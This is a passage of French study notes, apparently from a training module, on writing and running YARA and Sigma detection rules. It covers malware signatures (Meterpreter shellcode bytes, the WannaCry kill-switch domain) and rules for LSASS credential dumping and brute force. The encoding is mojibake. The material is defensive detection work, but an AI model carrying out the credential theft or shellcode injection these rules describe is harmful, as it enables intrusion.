* La rÃ¨gle utilise des chaÃ®nes typiques d'un fichier packagÃ© avec UPX (comme `UPX0`, `UPX1`, et `UPX2`) pour identifier les exÃ©cutables suspectÃ©s d'Ãªtre compressÃ©s par UPX.
* La condition `all of them` vÃ©rifie que toutes les chaÃ®nes sont prÃ©sentes dans le fichier.

---

### 2. ğŸ”§ **GÃ©nÃ©ration dâ€™une RÃ¨gle YARA avec `yarGen`**

**Commandes :**

```bash
Kailez@htb[/htb]$ python3 yarGen.py -m /home/htb-student/temp -o htb_sample.yar
```

**ExÃ©cution :**

```bash
Kailez@htb[/htb]$ cat htb_sample.yar
```

Cela gÃ©nÃ¨re automatiquement une rÃ¨gle YARA en utilisant les caractÃ©ristiques des fichiers prÃ©sents dans le rÃ©pertoire `/home/htb-student/temp`.

---

### 3. ğŸ§© **Exemples de DÃ©veloppement Manuel de RÃ¨gles YARA**

#### Exemple 1 : **DÃ©tection du RAT ZoxPNG utilisÃ© par APT17**

**Analyse de chaÃ®nes :**

```bash
Kailez@htb[/htb]$ strings legit.exe
```

**Calcul du `imphash` :**

```bash
Kailez@htb[/htb]$ python3 imphash_calc.py /home/htb-student/Samples/YARASigma/legit.exe
```

#### RÃ¨gle YARA pour APT17 :

```yaml
import "pe"

rule APT17_Malware_Oct17_Gen {
    meta:
        description = "DÃ©tecte le malware APT17"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Florian Roth (Nextron Systems)"
        reference = "https://goo.gl/puVc9q"
        date = "2017-10-03"
        hash1 = "0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2"
    strings:
        $x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)" fullword ascii
        $x2 = "http://%s/imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4-J8Q1lmYBM" ascii
        $s1 = "hWritePipe2 Error:%d" fullword ascii
        $s2 = "Not Support This Function!" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 200KB and (
            pe.imphash() == "414bbd566b700ea021cfae3ad8f4d9b9" or
            1 of ($x*) or
            6 of them
        )
}
```

**Explication :**

* Utilisation d'un `imphash` pour identifier les fichiers APT17.
* La condition de dÃ©tection vÃ©rifie la signature du fichier, sa taille, et certaines chaÃ®nes spÃ©cifiques, ainsi que l'empreinte de son fichier PE (`pe.imphash()`).

---

#### Exemple 2 : **DÃ©tection de Neuron UtilisÃ© par Turla**

**Reverse Engineering avec `monodis` :**

```bash
Kailez@htb[/htb]$ monodis --output=code Microsoft.Exchange.Service.exe
Kailez@htb[/htb]$ cat code
```

#### RÃ¨gle YARA pour Neuron :

```yaml
rule neuron_functions_classes_and_vars {
    meta:
        description = "RÃ¨gle de dÃ©tection pour Neuron basÃ© sur les fonctions .NET et les noms de classes"
        author = "NCSC UK"
        reference = "https://www.ncsc.gov.uk/file/2691/download?token=RzXWTuAB"
        hash = "d1d7a96fcadc137e80ad866c838502713db9cdfe59939342b8e3beacf9c7fe29"
    strings:
        $class1 = "StorageUtils" ascii
        $class2 = "WebServer" ascii
        $func1 = "AddConfigAsString" ascii
        $func2 = "EncryptScript" ascii
        $dotnetMagic = "BSJB" ascii
    condition:
        uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550 and $dotnetMagic and 6 of them
}
```

**Explication :**

* Cette rÃ¨gle cherche des chaÃ®nes spÃ©cifiques Ã  des fonctions et classes prÃ©sentes dans l'exÃ©cution de Neuron.
* La condition vÃ©rifie la signature du fichier et des chaÃ®nes associÃ©es aux fonctions et classes dans le fichier .NET.

---

#### Exemple 3 : **DÃ©tection de Stonedrill UtilisÃ© dans Shamoon 2.0**

**Analyse d'entropie :**

```bash
Kailez@htb[/htb]$ python3 entropy_pe_section.py -f /home/htb-student/Samples/YARASigma/sham2.exe
```

#### RÃ¨gle YARA pour Stonedrill :

```yaml
import "pe"
import "math"

rule susp_file_enumerator_with_encrypted_resource_101 {
    meta:
        copyright = "Kaspersky Lab"
        description = "DÃ©tection gÃ©nÃ©rique pour les Ã©chantillons Ã©numÃ©rant les fichiers avec une ressource cryptÃ©e appelÃ©e 101"
        reference = "https://securelist.com/from-shamoon-to-stonedrill/77725/"
        hash = "2cd0a5f1e9bcce6807e57ec8477d222a"
    strings:
        $mz = "This program cannot be run in DOS mode."
        $a1 = "FindFirstFile" ascii wide nocase
        $a3 = "FindResource" ascii wide nocase
    condition:
        uint16(0) == 0x5A4D and all of them and filesize < 700000 and
        pe.number_of_sections > 4 and pe.number_of_signatures == 0 and
        pe.number_of_resources > 1 and pe.number_of_resources < 15 and
        for any i in (0..pe.number_of_resources - 1):
        ( (math.entropy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and
          pe.resources[i].id == 101 and pe.resources[i].length > 20000 and
          pe.resources[i].language == 0 and
          not ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))
        )
}
```

**Explication :**

* Recherche de fichiers ayant une ressource cryptÃ©e spÃ©cifique (id 101).
* Utilisation de l'entropie pour identifier des ressources compressÃ©es ou cryptÃ©es et filtrage par taille et langue des ressources.

---

### ğŸ“š **Ressources pour le DÃ©veloppement de RÃ¨gles YARA**

* **Documentation officielle de YARA** : [YARA Documentation](https://yara.readthedocs.io/)
* **Guide Kaspersky sur le dÃ©veloppement de rÃ¨gles YARA** : [Kaspersky Guide](https://securelist.com/)

---

```

## **Hunting Evil with YARA (Windows Edition)**

```jsx
### Vue d'Ensemble

Utiliser **YARA** sur des systÃ¨mes Windows est efficace pour identifier les menaces sur le disque et en mÃ©moire.

#### Ã‰tapes ClÃ©s :

* **Se connecter au systÃ¨me cible** :

  * Lancez le systÃ¨me cible.
  * Utilisez RDP pour vous connecter avec les identifiants fournis.

---

### Recherche de fichiers exÃ©cutables malveillants sur le disque

* **Exemple de fichier** : dharma\_sample.exe situÃ© dans C:\Samples\YARASigma.
* **Analyse hexadÃ©cimale** : Utilisation de HxD pour inspecter des chaÃ®nes telles que `C:\crysis\Release\PDB\payload.pdb` et `sssssbsss`.
* **Exemple de rÃ¨gle YARA** : DÃ©tection de motifs dans des exÃ©cutables malveillants.

#### RÃ¨gle YARA Exemple : Ransomware Dharma

```yara
rule ransomware_dharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "DÃ©tecte les chaÃ®nes du ransomware Dharma"
        reference = "https://www.virustotal.com"

    strings:
        $string_pdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462 }
        $string_ssss = { 73 73 73 73 73 62 73 73 73 }

    condition: all of them
}
```

#### Commande pour exÃ©cuter un scan YARA sur des fichiers

```bash
yara64.exe -s C:\Rules\yara\dharma_ransomware.yar C:\Samples\YARASigma\ -r 2>null
```

* **Fichiers dÃ©tectÃ©s** : pdf\_reader.exe, microsoft.com, check\_updates.exe, KB5027505.exe.

---

### Recherche de malwares dans les processus en cours

* **Processus cible** : Exemple avec injection de shellcode Meterpreter.
* **RÃ¨gle YARA pour Metasploit Meterpreter** :

```yara
rule meterpreter_reverse_tcp_shellcode {
    meta:
        author = "FDD @ Cuckoo sandbox"
        description = "Shellcode TCP inverse de Meterpreter pour Metasploit"

    strings:
        $s1 = { fce8 8?00 0000 60 }
        $s2 = { 648b ??30 }
        $s3 = { 4c77 2607 }
        $s4 = "ws2_"
        $s5 = { 2980 6b00 }
        $s6 = { ea0f dfe0 }
        $s7 = { 99a5 7461 }

    condition: 5 of them
}
```

#### Scanning des processus actifs

```powershell
Get-Process | ForEach-Object { 
    "Scanning with Yara for meterpreter shellcode on PID "+$_.id; 
    & "yara64.exe" "C:\Rules\yara\meterpreter_shellcode.yar" $_.id 
}
```

* **RÃ©sultat** : DÃ©tecte le shellcode dans le processus PID 9084.

---

### Recherche de comportements malveillants dans les donnÃ©es ETW avec YARA

#### Principaux fournisseurs ETW (Event Tracing for Windows)

* **Microsoft-Windows-Kernel-Process** : Suit les activitÃ©s des processus.
* **Microsoft-Windows-Kernel-File** : Surveille les opÃ©rations de fichiers.
* **Microsoft-Windows-DNS-Client** : Journalise l'activitÃ© DNS (utile pour la dÃ©tection de C2).

#### IntÃ©gration de YARA avec SilkETW

* **Exemple de fournisseur PowerShell ETW** :

```powershell
.\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p ./etw_ps_logs.json -l verbose -y C:\Rules\yara -yo Matches
```

* **RÃ¨gle YARA pour les chaÃ®nes PowerShell** :

```yara
rule powershell_hello_world_yara {
    strings:
        $s0 = "Write-Host" ascii wide nocase
        $s1 = "Hello" ascii wide nocase
        $s2 = "from" ascii wide nocase
        $s3 = "PowerShell" ascii wide nocase
    condition: 3 of ($s*)
}
```

* **Fournisseur DNS Client** :

```powershell
.\SilkETW.exe -t user -pn Microsoft-Windows-DNS-Client -ot file -p ./etw_dns_logs.json -l verbose -y C:\Rules\yara -yo Matches
```

* **RÃ¨gle YARA pour un domaine de WannaCry** :

```yara
rule dns_wannacry_domain {
    strings:
        $s1 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii wide nocase
    condition: $s1
}
```

---

Ces techniques permettent d'effectuer des recherches approfondies Ã  la fois sur le disque et en mÃ©moire, ainsi que dans les processus en cours et les Ã©vÃ©nements systÃ¨me pour identifier les comportements malveillants. L'utilisation de YARA et d'outils comme SilkETW et Volatility permet d'amÃ©liorer l'efficacitÃ© des investigations de sÃ©curitÃ© en exploitant des sources de donnÃ©es variÃ©es.

```

## **Hunting Evil with YARA (Linux Edition)**

```jsx

Lorsqu'un accÃ¨s direct Ã  un systÃ¨me est restreint, les captures de mÃ©moire peuvent toujours nous permettre d'enquÃªter sur des menaces potentielles. En utilisant **YARA** sur ces captures de mÃ©moire, les analystes en sÃ©curitÃ© peuvent rechercher des indicateurs de compromission, mÃªme lorsque le systÃ¨me lui-mÃªme reste inaccessible.

---

### Processus ClÃ© :

1. **CrÃ©er des rÃ¨gles YARA** : DÃ©veloppez des rÃ¨gles ciblant les caractÃ©ristiques des malwares basÃ©s sur la mÃ©moire ou des comportements suspects.
2. **Compiler les rÃ¨gles** : Utilisez `yarac` pour compiler les rÃ¨gles YARA au format binaire `.yrc` (optionnel pour de meilleures performances).
3. **Capturer l'image mÃ©moire** : Utilisez des outils tels que **DumpIt**, **MemDump**, **Belkasoft RAM Capturer**, **Magnet RAM Capture**, **FTK Imager**, ou **LiME** (Linux Memory Extractor).
4. **Analyser l'image mÃ©moire avec YARA** : ExÃ©cutez **YARA** sur l'image mÃ©moire pour dÃ©tecter les correspondances.

---

### Exemple de Scan de MÃ©moire avec YARA

**Image mÃ©moire** : `compromised_system.raw` situÃ©e dans `/home/htb-student/MemoryDumps`.
**Fichier de rÃ¨gle YARA** : `wannacry_artifacts_memory.yar` situÃ© dans `/home/htb-student/Rules/yara`.

```bash
yara /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar /home/htb-student/MemoryDumps/compromised_system.raw --print-strings
```

**Sortie Exemple :**

```
DÃ©tection de motifs liÃ©s au ransomware WannaCry, comme `tasksche.exe` et autres artefacts connus.
```

---

### IntÃ©gration de YARA avec Volatility pour l'Analyse de MÃ©moire

**Volatility Framework**
**Volatility** est un outil puissant pour analyser des images mÃ©moire sur plusieurs plateformes OS. En utilisant **YARA** dans **Volatility** via le plugin **yarascan**, les analystes peuvent rechercher des indicateurs de malwares spÃ©cifiques dans la mÃ©moire.

#### Exemple - Recherche d'un ModÃ¨le Unique

Rechercher une URI codÃ©e en dur sans fichier YARA :

```bash
vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -U "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
```

**Sortie** :
Trouve des occurrences de cette URI dans l'image mÃ©moire.

#### Exemple - Scan avec Plusieurs RÃ¨gles

Appliquer un ensemble de rÃ¨gles YARA avec l'option `-y` de **Volatility** :

```bash
vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -y /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar
```

**Sortie Exemple** :
Identifie des artefacts spÃ©cifiques de **WannaCry** dans l'image mÃ©moire.

---

### Exemple de RÃ¨gle YARA pour WannaCry

```yara
rule Ransomware_WannaCry {
    meta:
        author = "Madhukar Raina"
        version = "1.1"
        description = "DÃ©tecte les chaÃ®nes de caractÃ¨res liÃ©es au ransomware WannaCry"
        reference = "https://www.virustotal.com"

    strings:
        $wannacry_payload_str1 = "tasksche.exe" fullword ascii
        $wannacry_payload_str2 = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacry_payload_str3 = "mssecsvc.exe" fullword ascii
        $wannacry_payload_str4 = "diskpart.exe" fullword ascii
        $wannacry_payload_str5 = "lhdfrgui.exe" fullword ascii

    condition: 3 of them
}
```

**Sortie Exemple** :
Identifie des artefacts spÃ©cifiques de **WannaCry** dans l'image mÃ©moire.

---

```

## **Hunting Evil with YARA (Web Edition)**

```jsx

**Unpac.Me** offre une solution robuste pour le dÃ©sempaquetage des malwares et permet aux analystes en sÃ©curitÃ© d'exÃ©cuter des rÃ¨gles YARA sur une vaste base de donnÃ©es de soumissions de malwares. Cette plateforme donne accÃ¨s Ã  un ensemble de donnÃ©es sur les malwares de qualitÃ© commerciale, ce qui en fait une ressource prÃ©cieuse pour les analystes SOC et les chercheurs en malwares.

---

### Tester des RÃ¨gles YARA avec Unpac.Me

Prenons l'exemple de la rÃ¨gle YARA suivante, ciblant le ransomware Dharma :

```yara
rule ransomware_dharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "DÃ©tecte les chaÃ®nes de caractÃ¨res du ransomware Dharma"
        reference = "https://www.virustotal.com"

    strings:
        $string_pdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462 }
        $string_ssss = { 73 73 73 73 73 62 73 73 73 }

    condition: all of them
}
```

### Ã‰tapes pour Lancer une Recherche YARA sur Unpac.Me

1. **Inscription** : Inscrivez-vous pour un compte gratuit sur **Unpac.Me**.
2. **DÃ©marrer une Nouvelle Recherche** :

   * Allez dans la section **Yara Hunt** et sÃ©lectionnez **Nouvelle Recherche**.
   * Copiez et collez la rÃ¨gle YARA dans le champ de saisie de la rÃ¨gle.
3. **Valider et Scanner** :

   * Cliquez sur **Valider** pour vous assurer que la rÃ¨gle est correcte, puis cliquez sur **Scanner**.
4. **Consulter les RÃ©sultats** : AprÃ¨s le scan, **Unpac.Me** affiche les rÃ©sultats, montrant les correspondances en quelques minutes.

```

## **Sigma and Sigma Rules**

```jsx

Sigma est un format de signature gÃ©nÃ©rique et standardisÃ© qui permet aux analystes SOC de crÃ©er, partager et utiliser des rÃ¨gles de dÃ©tection pour l'analyse des journaux Ã  travers diffÃ©rentes plateformes. Ã‰crites en YAML, les rÃ¨gles Sigma offrent une portabilitÃ© inter-plateformes, permettant aux analystes d'Ã©crire une rÃ¨gle une fois et de la dÃ©ployer sur divers systÃ¨mes SIEM et EDR.

---

### Cas d'Utilisation Principaux des RÃ¨gles Sigma

* **Analyse Universelle des Journaux** : RÃ©diger des rÃ¨gles de dÃ©tection une seule fois et les convertir en formats compatibles avec divers SIEM.
* **Partage de RÃ¨gles Communautaires** : AccÃ©der Ã  une bibliothÃ¨que croissante de rÃ¨gles Sigma partagÃ©es par la communautÃ© et y contribuer.
* **RÃ©ponse aux Incidents** : Rechercher efficacement des indicateurs dans les journaux lors dâ€™incidents.
* **Chasse Proactive aux Menaces** : Utiliser les rÃ¨gles Sigma pour dÃ©tecter des anomalies ou des menaces dans les ensembles de donnÃ©es.
* **IntÃ©gration avec des Outils dâ€™Automatisation** : Automatiser les rÃ©ponses en utilisant les rÃ¨gles Sigma avec des plateformes SOAR.
* **Personnalisation** : Adapter les rÃ¨gles Sigma aux besoins spÃ©cifiques de l'environnement.
* **Analyse des Ã‰carts** : Effectuer une analyse des Ã©carts en alignant les rÃ¨gles personnalisÃ©es avec les standards de la communautÃ©.

---

### Comment Sigma Fonctionne

Sigma exprime les modÃ¨les de dÃ©tection dans un format structurÃ©, avec des rÃ¨gles Ã©crites en YAML. Une rÃ¨gle Sigma comprend les Ã©lÃ©ments suivants :

* **Titre, Description et ID** : Informations de base sur la rÃ¨gle.
* **Source de Journaux** : SpÃ©cifie le type de journal cible, la plateforme et lâ€™application.
* **ModÃ¨le de DÃ©tection** : Inclut les identifiants de recherche et les conditions de correspondance.
* **Faux Positifs, Auteur et Date** : Champs optionnels pour fournir un contexte.

---

### Conversion Sigma (sigmac et pySigma)

Le pouvoir de Sigma rÃ©side dans sa capacitÃ© Ã  Ãªtre converti. Des outils comme **sigmac** (et de plus en plus **pySigma**) transforment les rÃ¨gles Sigma en requÃªtes ou configurations compatibles avec des SIEM populaires (ElasticSearch, QRadar, Splunk, etc.).

---

### Structure d'une RÃ¨gle Sigma

Les rÃ¨gles Sigma sont des fichiers YAML avec des champs structurÃ©s. Voici un exemple de format de rÃ¨gle Sigma.

```yaml
title: ExÃ©cution potentielle de la technique LethalHTA 
id: ed5d72a6-f8f4-479d-ba79-02f6a80d7471 
status: test 
description: DÃ©tecte une technique potentielle LethalHTA oÃ¹ "mshta.exe" est lancÃ© par un processus "svchost.exe"
references:
    - https://codewhitesec.blogspot.com/2018/07/lethalhta.html
author: Markus Neis 
date: 2018/06/07 
tags: 
    - attack.defense_evasion 
    - attack.t1218.005 
logsource: 
    category: process_creation  
    product: windows
detection:
    selection: 
        ParentImage|endswith: '\svchost.exe'
        Image|endswith: '\mshta.exe'
    condition: selection
falsepositives: 
    - Unknown
level: high
```

---

### Composants ClÃ©s d'une RÃ¨gle Sigma

* **Titre** : DÃ©crit l'objet de dÃ©tection (par exemple, "ExÃ©cution potentielle de la technique LethalHTA").
* **ID** : Identifiant unique (il est recommandÃ© d'utiliser un UUID).
* **Statut** : Statut de la rÃ¨gle (par exemple, stable, test, expÃ©rimental).
* **Description** : Explication succincte de ce que la rÃ¨gle dÃ©tecte.
* **RÃ©fÃ©rences** : Liens vers des articles ou des recherches de soutien.
* **Auteur** : Nom ou pseudonyme du crÃ©ateur de la rÃ¨gle.
* **Date** : Date de crÃ©ation au format AAAA/MM/JJ.
* **Source de Journaux** : SpÃ©cifie la source du journal et la plateforme (par exemple, catÃ©gorie : `process_creation`, produit : `windows`).
* **ModÃ¨le de DÃ©tection** :

  * **SÃ©lection** : SpÃ©cifie les motifs Ã  faire correspondre dans les journaux.
  * **Condition** : DÃ©crit la relation entre les motifs (par exemple, condition : sÃ©lection).

---

### Modificateurs de DÃ©tection

Les modificateurs affinent les recherches de dÃ©tection :

* **contains** : Utilise des jokers aux deux extrÃ©mitÃ©s d'une valeur (par exemple, `CommandLine|contains`).
* **startswith / endswith** : Utilise des jokers Ã  une extrÃ©mitÃ© seulement.
* **re** : Correspondance basÃ©e sur des expressions rÃ©guliÃ¨res.

Exemple d'utilisation de modificateurs :

```yaml
detection:
  selection:
    ParentImage|endswith: '\svchost.exe'
    Image|endswith: '\mshta.exe'
  condition: selection
```

---

### Meilleures Pratiques pour le DÃ©veloppement de RÃ¨gles Sigma

Le guide de crÃ©ation des rÃ¨gles Sigma fournit des meilleures pratiques pour le dÃ©veloppement de rÃ¨gles, y compris des informations dÃ©taillÃ©es sur la structuration et l'Ã©criture de rÃ¨gles de dÃ©tection efficaces.

---

### OpÃ©rateurs Communs dans les Conditions

Les conditions Sigma lient les Ã©lÃ©ments de dÃ©tection, en utilisant des opÃ©rateurs comme :

* **and / or** : Conjonctions logiques.
* **all of them** : Correspond Ã  tous les motifs.
* **not** : Exclut certaines correspondances.
* **ParenthÃ¨ses ()** : Force lâ€™ordre des opÃ©rations.

Exemple de condition :

```yaml
condition: selection1 or selection2 or selection3
```

---

```

## **Developing Sigma Rules**

```jsx

---

## ğŸ§  Introduction aux RÃ¨gles Sigma : DÃ©tection Manuelle BasÃ©e sur des Cas RÃ©els

Ce guide prÃ©sente la crÃ©ation manuelle de rÃ¨gles Sigma, Ã  partir de scÃ©narios concrets visant Ã  dÃ©tecter des activitÃ©s suspectes sur un systÃ¨me Windows.

---

### ğŸ“Œ Exemple 1 : DÃ©tection dâ€™une Extraction de CrÃ©dentiels via LSASS

**Contexte** : Un processus comme `shell.exe` (exÃ©cutant mimikatz) tente dâ€™accÃ©der Ã  la mÃ©moire du processus `lsass.exe`. Ce comportement est typiquement dÃ©tectÃ© via **lâ€™Event ID 10 de Sysmon**.

#### ğŸ“ Informations clÃ©s

* **Event ID Sysmon** : 10
* **Champs critiques** :

  * `TargetImage` : processus ciblÃ© (ex. : `lsass.exe`)
  * `GrantedAccess` : droits dâ€™accÃ¨s, souvent `0x1010` (lecture et requÃªte)

#### âœ… RÃ¨gle Sigma de base : AccÃ¨s suspect Ã  LSASS

```yaml
title: AccÃ¨s Ã  LSASS avec droit dâ€™accÃ¨s rare
status: experimental
description: DÃ©tecte un accÃ¨s mÃ©moire au processus LSASS avec le flag dâ€™accÃ¨s 0x1010
date: 2023/07/08
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|endswith: '0x1010'
  condition: selection
```

#### ğŸ¯ Explication

* **TargetImage** : vÃ©rifie si le processus cible est `lsass.exe`.
* **GrantedAccess** : filtre les accÃ¨s avec les droits `0x1010`.
* **Condition** : alerte si les critÃ¨res sont remplis.

#### â–¶ï¸ ExÃ©cution avec `sigmac`

Pour convertir cette rÃ¨gle en requÃªte PowerShell :

```bash
python sigmac -t powershell 'C:\Rules\sigma\proc_access_win_lsass_access.yml'
```

---

### ğŸ§° Version avancÃ©e : Filtrage des faux positifs

Ajoute un contrÃ´le sur le chemin dâ€™exÃ©cution du processus source, en excluant les chemins habituels.

```yaml
title: AccÃ¨s LSASS depuis un programme dans un dossier suspect
id: fa34b441-961a-42fa-a100-ecc28c886725
status: experimental
description: DÃ©tection dâ€™un accÃ¨s mÃ©moire Ã  LSASS depuis un dossier potentiellement malveillant
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|endswith:
      - '10'
      - '30'
      - '50'
      - '70'
      - '90'
      - 'B0'
      - 'D0'
      - 'F0'
  SourceImage|contains:
    - '\Temp\'
    - '\Users\Public\'
  condition: selection and not 1 of filter_optional_*
```

---

### ğŸ” Exemple 2 : Tentatives dâ€™authentification Ã©chouÃ©es multiples

**Event ID 4776** : utilisÃ© pour dÃ©tecter des tentatives de validation NTLM. Plusieurs Ã©checs depuis une mÃªme machine peuvent indiquer une attaque par force brute.

```yaml
title: Connexions NTLM Ã©chouÃ©es depuis une seule machine avec comptes diffÃ©rents
id: 6309ffc4-8fa2-47cf-96b8-a2f72e58e538
logsource:
  product: windows
  service: security
detection:
  selection2:
    EventID: 4776
    TargetUserName: '*'
    Workstation: '*'
  condition: selection2 | count(TargetUserName) by Workstation > 3
```

#### âœ… Explication

* **Event ID 4776** : Ã©vÃ©nements de tentative dâ€™authentification NTLM.
* **DÃ©clenchement** : lorsquâ€™une machine tente de se connecter avec plus de 3 comptes diffÃ©rents.

---

### ğŸ“š Ressources utiles pour crÃ©er des rÃ¨gles Sigma

* ğŸ“– [Guide officiel de crÃ©ation de rÃ¨gles Sigma](https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide)
* ğŸ“˜ [SpÃ©cifications Sigma](https://github.com/SigmaHQ/sigma-specification)
* ğŸ“‘ [Articles sur le dÃ©veloppement Sigma](https://tech-en.netlify.app/articles/en510480/)

---

```

## **Hunting Evil with Sigma (Chainsaw Edition)**

```jsx

---

### ğŸ” **Analyse des Journaux d'Ã‰vÃ©nements Windows avec Chainsaw**

**Chainsaw** est un outil puissant et gratuit conÃ§u pour aider les analystes en cybersÃ©curitÃ© Ã  explorer rapidement les journaux d'Ã©vÃ©nements Windows et dÃ©tecter des activitÃ©s suspectes. Il prend en charge les **rÃ¨gles Sigma** ainsi que des rÃ¨gles personnalisÃ©es **Chainsaw**, ce qui en fait un outil polyvalent pour la chasse aux menaces et l'analyse des journaux.

Vous pouvez trouver **Chainsaw** dans le rÃ©pertoire `C:\Tools\chainsaw` sur le systÃ¨me cible.

#### 1. **Utiliser Chainsaw pour la Recherche de Tentatives de Connexion Ã‰chouÃ©es Multiples**

Dans cet exemple, nous allons appliquer la rÃ¨gle **Sigma** pour dÃ©tecter les **tentatives de connexion Ã©chouÃ©es multiples** provenant de la mÃªme source.

**RÃ¨gle Sigma Ã  utiliser :**
`win_security_susp_failed_logons_single_source2.yml`
**Fichier EVTX :**
`lab_events_2.evtx`

**Ã‰tapes Ã  suivre :**

```powershell
PS C:\Tools\chainsaw> .\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_2.evtx -s C:\Rules\sigma\win_security_susp_failed_logons_single_source2.yml --mapping .\mappings\sigma-event-logs-all.yml
```

**Sortie :**

```bash
[+] 1 Detections found on 1 documents
```

**Explication :**

* La rÃ¨gle a rÃ©ussi Ã  dÃ©tecter les tentatives de connexion Ã©chouÃ©es multiples provenant de la mÃªme source. Dans ce cas, elle a trouvÃ© plusieurs tentatives de connexion Ã©chouÃ©es contre un utilisateur inexistant (`NOUSER`).

---

#### 2. **Recherche de Commandes PowerShell Anormalement Longues**

PowerShell est souvent utilisÃ© Ã  des fins malveillantes en raison de sa flexibilitÃ© et de son intÃ©gration avec les API Windows et le framework .NET. Les attaquants peuvent en abuser pour exÃ©cuter des commandes malveillantes. Des lignes de commande PowerShell anormalement longues peuvent Ãªtre un indicateur d'une activitÃ© suspecte.

**RÃ¨gle Sigma Ã  utiliser :**
`proc_creation_win_powershell_abnormal_commandline_size.yml`
**Fichier EVTX :**
`lab_events_3.evtx`

**RÃ¨gle Sigma (pour rÃ©fÃ©rence) :**

```yaml
title: Unusually Long PowerShell CommandLine
id: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6
status: test
description: Detects unusually long PowerShell command lines with a length of 1000 characters or more
references:
    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
author: oscd.community, Natalia Shornikova / HTB Academy, Dimitrios Bougioukas
date: 2020/10/06
modified: 2023/04/14
tags:
    - attack.execution
    - attack.t1059.001
    - detection.threat_hunting
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
    selection_powershell:
        CommandLine|contains:
            - 'powershell.exe'
            - 'pwsh.exe'
    selection_length:        
        CommandLine|re: '.{1000,}'
    condition: selection and selection_powershell and selection_length
falsepositives:
    - Unknown
level: low
```

**Ã‰tapes Ã  suivre :**

```powershell
PS C:\Tools\chainsaw> .\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_3.evtx -s C:\Rules\sigma\proc_creation_win_powershell_abnormal_commandline_size.yml --mapping .\mappings\sigma-event-logs-all-new.yml
```

**Sortie :**

```bash
[+] 3 Detections found on 3 documents
```

**Explication :**

* Cette rÃ¨gle a rÃ©ussi Ã  dÃ©tecter toutes les instances de lignes de commande PowerShell anormalement longues dans le fichier `lab_events_3.evtx`. Ces lignes de commande longues pourraient indiquer qu'un attaquant tente d'exÃ©cuter une commande complexe ou obfusquÃ©e.

---

### ğŸ“ **Points ClÃ©s Ã  Retenir :**

* **Chainsaw** est un outil puissant et rapide pour analyser les **journaux d'Ã©vÃ©nements Windows** et appliquer des **rÃ¨gles Sigma**.
* Les **rÃ¨gles Sigma** offrent une maniÃ¨re standardisÃ©e de dÃ©tecter des activitÃ©s suspectes, comme des tentatives de connexion Ã©chouÃ©es ou l'exÃ©cution de commandes PowerShell anormales.
* Une bonne **configuration** est essentielle lors de l'utilisation des rÃ¨gles Sigma avec Chainsaw ou tout autre outil pour garantir une dÃ©tection prÃ©cise des Ã©vÃ©nements.

En utilisant **Chainsaw** avec des rÃ¨gles Sigma bien configurÃ©es, vous pouvez dÃ©tecter efficacement les menaces et les attaques potentielles dans votre environnement, mÃªme en l'absence d'une solution SIEM.

---

```

## **Hunting Evil with Sigma (Splunk Edition)**

```jsx

---

### ğŸ” **Valider l'Approche Sigma avec Splunk**

Comme discutÃ© lors de l'introduction de **Sigma**, les rÃ¨gles Sigma rÃ©volutionnent notre approche de l'analyse des journaux et de la dÃ©tection des menaces. Agissant comme un traducteur universel, **Sigma** offre un niveau d'abstraction aux journaux d'Ã©vÃ©nements, supprimant la nÃ©cessitÃ© d'utiliser des langages de requÃªte spÃ©cifiques Ã  un SIEM, et permettant l'utilisation de la logique de dÃ©tection commune Ã  travers diffÃ©rentes plateformes.

Nous allons maintenant valider cette approche en convertissant deux rÃ¨gles Sigma en format SPL de **Splunk** et en examinant les rÃ©sultats.

---

### **Exemple 1 : Recherche d'Abus de la Fonction MiniDump pour Dumper la MÃ©moire de LSASS (comsvcs.dll via rundll32)**

Une rÃ¨gle **Sigma** nommÃ©e `proc_access_win_lsass_dump_comsvcs_dll.yml` est disponible dans le rÃ©pertoire suivant :

```
C:\Tools\chainsaw\sigma\rules\windows\process_access
```

Cette rÃ¨gle Sigma dÃ©tecte les adversaires qui utilisent la fonction d'exportation **MiniDump** de **comsvcs.dll** via **rundll32** pour effectuer un vidage de mÃ©moire de **LSASS**.

Pour convertir cette rÃ¨gle en une requÃªte compatible avec Splunk, nous pouvons utiliser **sigmac** comme suit :

```powershell
PS C:\Tools\sigma-0.21\tools> python sigmac -t splunk C:\Tools\chainsaw\sigma\rules\windows\process_access\proc_access_win_lsass_dump_comsvcs_dll.yml -c .\config\splunk-windows.yml
```

